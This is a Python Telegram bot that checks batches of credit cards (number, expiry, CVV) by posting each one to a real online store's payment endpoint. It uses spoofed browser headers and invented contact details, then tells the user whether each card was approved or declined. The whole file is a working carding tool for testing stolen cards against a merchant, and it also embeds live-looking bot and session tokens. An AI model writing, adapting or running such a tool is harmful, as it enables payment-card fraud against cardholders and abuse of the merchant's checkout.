import telebot
import requests
import threading
import time
import re

API_TOKEN = '7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY'

bot = telebot.TeleBot(API_TOKEN)

# To keep track of users currently checking cards
checking_users = set()
lock = threading.Lock()

# Regex to parse card input
card_pattern = re.compile(
    r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})'
)

# Headers for the POST request
HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json;charset=UTF-8",
    "origin": "https://shortcutor.onfastspring.com",
    "referer": "https://shortcutor.onfastspring.com/s1-standard-year1",
    "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "x-session-token": "new/wBlCYyYnSuSncjZE506B-A"  # This token may expire/change; update if needed
}

CHECK_URL = "https://shortcutor.onfastspring.com/session/s1-standard-year1/payment"

def parse_cards(text):
    """Extract all valid cards from the text."""
    cards = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        match = card_pattern.fullmatch(line)
        if match:
            number, month, year, cvv = match.groups()
            # Normalize year to 4 digits
            if len(year) == 2:
                year = '20' + year
            cards.append({
                "number": number,
                "month": month.zfill(2),
                "year": year,
                "cvv": cvv
            })
    return cards

def check_card(card):
    """Send card data and return response and status."""
    payload = {
        "contact": {
            "email": "peshangdev@gmail.com",
            "country": "IQ",
            "firstName": "John",
            "lastName": "Doe",
            "phoneNumber": "3144746650"
        },
        "card": {
            "year": card["year"],
            "month": card["month"],
            "number": card["number"],
            "security": card["cvv"]
        },
        "sepa": {
            "iban": "",
            "ipAddress": "176.222.63.3"
        },
        "ach": {
            "routingNum": "",
            "accountType": "",
            "accountNum": "",
            "confirmAccountNumber": ""
        },
        "upi": {
            "mobileAppSelected": "",
            "requestMobileExperience": False
        },
        "mercadopago": {
            "cpfNumber": ""
        },
        "paymentType": "card",
        "subscribe": True,
        "recipientSelected": False
    }
    try:
        response = requests.post(CHECK_URL, json=payload, headers=HEADERS, timeout=30)
        response.raise_for_status()
        data = response.json()
        # Determine card status
        messages = data.get("messages", [])
        declined = any(msg.get("type") == "danger" for msg in messages)
        status = "Declined" if declined else "Approved"
        return status, data
    except Exception as e:
        return "Error", {"error": str(e)}

def card_checking_thread(chat_id, cards):
    with lock:
        checking_users.add(chat_id)
    try:
        for idx, card in enumerate(cards, 1):
            with lock:
                if chat_id not in checking_users:
                    bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                    break
            bot.send_message(chat_id, f"🔎 Checking card {idx}/{len(cards)}: `{card['number']}|{card['month']}|{card['year']}|{card['cvv']}`", parse_mode='Markdown')
            status, data = check_card(card)
            if status == "Error":
                bot.send_message(chat_id, f"❌ Error checking card:\n`{data['error']}`", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, f"✅ Card {status}!\nFull response:\n`{data}`", parse_mode='Markdown')
            if idx < len(cards):
                time.sleep(15)
    finally:
        with lock:
            checking_users.discard(chat_id)
        bot.send_message(chat_id, "✅ All card checks completed.")

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "Welcome! Please send credit cards to check in one of these formats:\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "You can send multiple cards separated by new lines.\n"
        "Send /stop to cancel ongoing checks.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    with lock:
        if message.chat.id in checking_users:
            checking_users.remove(message.chat.id)
            bot.send_message(message.chat.id, "⏹️ Stopping card checks...")
        else:
            bot.send_message(message.chat.id, "No ongoing card checks to stop.")

@bot.message_handler(func=lambda m: True)
def message_handler(message):
    chat_id = message.chat.id
    if chat_id in checking_users:
        bot.send_message(chat_id, "⏳ Please wait, your previous check is still running. Send /stop to cancel.")
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(chat_id, "❌ No valid card formats found. Please follow the specified formats.")
        return

    bot.send_message(chat_id, f"🟢 Starting to check {len(cards)} card(s)...")
    threading.Thread(target=card_checking_thread, args=(chat_id, cards), daemon=True).start()

if __name__ == '__main__':
    print("Bot started...")
    bot.infinity_polling()
